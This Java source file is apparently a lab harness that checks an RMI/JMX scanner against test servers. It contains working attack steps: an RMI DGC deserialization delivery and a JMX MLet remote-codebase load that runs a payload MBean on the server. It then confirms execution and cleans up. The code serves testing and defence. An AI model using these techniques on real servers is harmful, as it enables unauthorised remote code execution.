import java.io.ObjectOutput;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HexFormat;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public final class NativeProbe {
  static final ObjectName STATE;
  static { try { STATE = new ObjectName(LabConfig.STATE); } catch (Exception e) { throw new ExceptionInInitializerError(e); } }
  static Map<String,Object> map(Object... fields) {
    Map<String,Object> result = new LinkedHashMap<>();
    for (int index = 0; index < fields.length; index += 2) result.put((String)fields[index], fields[index + 1]);
    return result;
  }
  static void require(boolean value, String message) { if (!value) throw new IllegalStateException(message); }
  static String token() { return UUID.randomUUID().toString().replace("-", ""); }
  static String hash(byte[] bytes) throws Exception { return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(bytes)); }
  static String errors(Throwable error) {
    StringBuilder value = new StringBuilder();
    for (Throwable next = error; next != null; next = next.getCause()) value.append(next.getClass().getName()).append(": ").append(next.getMessage()).append("\n");
    return value.toString();
  }
  static String json(Object value) {
    if (value == null) return "null";
    if (value instanceof Number || value instanceof Boolean) return value.toString();
    if (value instanceof Map<?,?> fields) {
      List<String> values = new ArrayList<>();
      fields.forEach((key, entry) -> values.add(json(key.toString()) + ":" + json(entry)));
      return "{" + String.join(",", values) + "}";
    }
    if (value instanceof Iterable<?> entries) {
      List<String> values = new ArrayList<>();
      for (Object entry : entries) values.add(json(entry));
      return "[" + String.join(",", values) + "]";
    }
    StringBuilder text = new StringBuilder("\"");
    for (char character : value.toString().toCharArray()) {
      switch (character) {
        case '"': text.append("\\\""); break;
        case '\\': text.append("\\\\"); break;
        case '\n': text.append("\\n"); break;
        case '\r': text.append("\\r"); break;
        case '\t': text.append("\\t"); break;
        default: if (character < 32) text.append(String.format("\\u%04x", (int)character)); else text.append(character);
      }
    }
    return text.append('"').toString();
  }
  static Map<String,Object> endpoint(Remote object) throws Exception {
    RemoteRef reference = object instanceof RemoteObject remote ? remote.getRef()
      : ((RemoteObjectInvocationHandler)Proxy.getInvocationHandler(object)).getRef();
    // Inspect the native stub; this opens only client-side JDK metadata.
    var method = LiveRef.class.getDeclaredMethod("getEndpoint");
    method.setAccessible(true);
    TCPEndpoint endpoint = (TCPEndpoint)method.invoke(((UnicastRef)reference).getLiveRef());
    return map("class", object.getClass().getName(), "host", endpoint.getHost(), "port", endpoint.getPort(), "reference", reference.remoteToString());
  }
  static JMXConnector connect(String role, String password) throws Exception {
    Map<String,Object> options = new LinkedHashMap<>();
    if (password != null) options.put(JMXConnector.CREDENTIALS, new String[]{"controlRole", password});
    return JMXConnectorFactory.connect(new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + role + ":" + LabConfig.REGISTRY + "/jmxrmi"), options);
  }
  static String readProof(MBeanServerConnection server, String nonce) throws Exception {
    return (String)server.invoke(STATE, "readProof", new Object[]{nonce}, new String[]{"java.lang.String"});
  }
  static void removeProof(MBeanServerConnection server, String nonce) throws Exception {
    require((Boolean)server.invoke(STATE, "removeProof", new Object[]{nonce}, new String[]{"java.lang.String"}), "Proof cleanup failed");
    require(readProof(server, nonce).equals("ABSENT"), "Proof remains after cleanup");
  }
  static void checkServerProof(String proof, String nonce, String runtimeName) {
    require(proof.startsWith("MODULE_TARGET_JAVA_PROOF:" + nonce + ":PID=" + runtimeName.split("@")[0] + ":USER="), "Proof is not from the actual server PID: " + proof);
  }
  // Native JDK RemoteRef call uses the same standard DGC clean operation as the
  // scanner. A foreign serializable argument exercises deserialization before
  // the expected VMID cast. The proof class is not on the server class path.
  static final class DgcClient extends RemoteObject {
    private static final long serialVersionUID = 1L;
    DgcClient(String host) { super(new UnicastRef(new LiveRef(new ObjID(2), new TCPEndpoint(host, LabConfig.REGISTRY), false))); }
    @SuppressWarnings("deprecation")
    String deliver(String nonce) throws Exception {
      Operation[] operations = {new Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"), new Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")};
      try {
        RemoteCall call = ref.newCall(this, operations, 0, -669196253586618813L);
        ObjectOutput output = call.getOutputStream();
        output.writeObject(new ObjID[0]);
        output.writeLong(0);
        output.writeObject(new ProbePayload(nonce));
        output.writeBoolean(false);
        ref.invoke(call);
        ref.done(call);
        return "returned";
      } catch (Exception error) { return errors(error); }
    }
  }
  static Map<String,Object> jmxProof(String role, MBeanServerConnection server, String runtimeName) throws Exception {
    String nonce = token();
    ObjectName loader = new ObjectName("module.target:type=Loader,token=" + nonce);
    ObjectName payload = new ObjectName("module.target:type=Payload,token=" + nonce);
    String proof = null;
    try {
      require(readProof(server, nonce).equals("ABSENT"), "Fresh JMX proof already exists");
      server.createMBean("javax.management.loading.MLet", loader);
      server.invoke(loader, "addURL", new Object[]{"http://enabled:" + LabConfig.HTTP + "/probe.jar"}, new String[]{"java.lang.String"});
      server.createMBean("ProbePayload", payload, loader);
      proof = (String)server.invoke(payload, "prove", new Object[]{nonce}, new String[]{"java.lang.String"});
      require(readProof(server, nonce).equals(proof), "JMX marker bytes differ");
      checkServerProof(proof, nonce, runtimeName);
    } finally {
      if (server.isRegistered(payload)) server.unregisterMBean(payload);
      if (server.isRegistered(loader)) server.unregisterMBean(loader);
      removeProof(server, nonce);
    }
    return map("role", role, "proof", proof, "loader_removed", !server.isRegistered(loader), "payload_removed", !server.isRegistered(payload), "owned_file_absent", true);
  }
  public static void main(String[] args) throws Exception {
    Map<String,Object> result = map("status", "native_failed", "framework_calls", 0,
      "java_version", System.getProperty("java.runtime.version"), "java_vendor", System.getProperty("java.vendor"));
    Map<String,Object> profiles = new LinkedHashMap<>();
    result.put("profiles", profiles);
    try {
      byte[] jar = Files.readAllBytes(Path.of("/lab/probe.jar"));
      try (var input = URI.create("http://enabled:" + LabConfig.HTTP + "/probe.jar").toURL().openStream()) {
        require(hash(input.readAllBytes()).equals(hash(jar)), "Actual codebase JAR differs");
      }
      result.put("probe_jar_sha256", hash(jar));
      for (String role : List.of("open", "guarded", "enabled", "empty")) {
        Registry registry = LocateRegistry.getRegistry(role, LabConfig.REGISTRY);
        String[] names = registry.list();
        Arrays.sort(names);
        require(Arrays.equals(names, role.equals("empty") ? new String[]{} : new String[]{"jmxrmi"}), "Registry names differ: " + role);
        Map<String,Object> profile = map("ip", InetAddress.getByName(role).getHostAddress(), "registry_names", Arrays.asList(names));
        profiles.put(role, profile);
        if (role.equals("empty")) {
          Registry multi = LocateRegistry.getRegistry(role, LabConfig.MULTI);
          String[] aliases = multi.list();
          Arrays.sort(aliases);
          require(Arrays.equals(aliases, new String[]{"lab/echo", "quoted café"}), "Genuine multi-registry names differ");
          List<Object> objects = new ArrayList<>();
          LabEcho echo = null;
          for (String alias : aliases) {
            echo = (LabEcho)multi.lookup(alias);
            String value = token();
            require(echo.ping(value).equals("module-target-echo:" + value), "Native remote method failed");
            objects.add(map("name", alias, "endpoint", endpoint(echo), "actual_method", true));
          }
          profile.put("multi_registry", objects);
          profile.put("loader_policy", echo.loaderPolicy());
          String nonce = token();
          require(echo.readProof(nonce).equals("ABSENT"), "Fresh empty-registry proof exists");
          String error = new DgcClient(role).deliver(nonce);
          require(echo.readProof(nonce).equals("ABSENT"), "Default DGC unexpectedly executed a payload");
          profile.put("dgc", map("error", error, "owned_file_absent", true));
          continue;
        }
        profile.put("jmx_endpoint", endpoint(registry.lookup("jmxrmi")));
        if (role.equals("guarded")) {
          for (String password : Arrays.asList(null, "wrong-password")) {
            try (JMXConnector refused = connect(role, password)) {
              throw new IllegalStateException("Guarded JMX accepted missing/invalid credentials");
            } catch (SecurityException expected) {
              profile.put(password == null ? "anonymous_refusal" : "invalid_password_refusal", errors(expected));
            }
          }
        }
        try (JMXConnector connector = connect(role, role.equals("guarded") ? "module-target-jmx-password" : null)) {
          MBeanServerConnection server = connector.getMBeanServerConnection();
          require(server.getAttribute(STATE, "Role").equals(role), "Wrong actual JMX server role");
          require(((String[])server.getAttribute(STATE, "Proofs")).length == 0, "Prior proof state remains");
          String runtimeName = (String)server.getAttribute(new ObjectName("java.lang:type=Runtime"), "Name");
          profile.put("runtime_name", runtimeName);
          profile.put("mbean_count", server.getMBeanCount());
          profile.put("loader_policy", server.getAttribute(STATE, "LoaderPolicy"));
          String nonce = token();
          require(readProof(server, nonce).equals("ABSENT"), "Fresh DGC proof exists");
          String error = new DgcClient(role).deliver(nonce);
          String proof = readProof(server, nonce);
          profile.put("dgc", map("error", error, "proof", proof, "executed", !proof.equals("ABSENT")));
          if (role.equals("enabled")) checkServerProof(proof, nonce, runtimeName);
          else require(proof.equals("ABSENT"), "Default DGC unexpectedly executed remote code");
          removeProof(server, nonce);
          if (!role.equals("guarded")) profile.put("jmx_execution", jmxProof(role, server, runtimeName));
          require(((String[])server.getAttribute(STATE, "Proofs")).length == 0, "Proof cleanup incomplete");
        }
      }
      result.put("status", "native_passed");
    } catch (Exception error) { result.put("error", errors(error)); }
    System.out.println(json(result));
    System.exit(result.get("status").equals("native_passed") ? 0 : 1);
  }
}
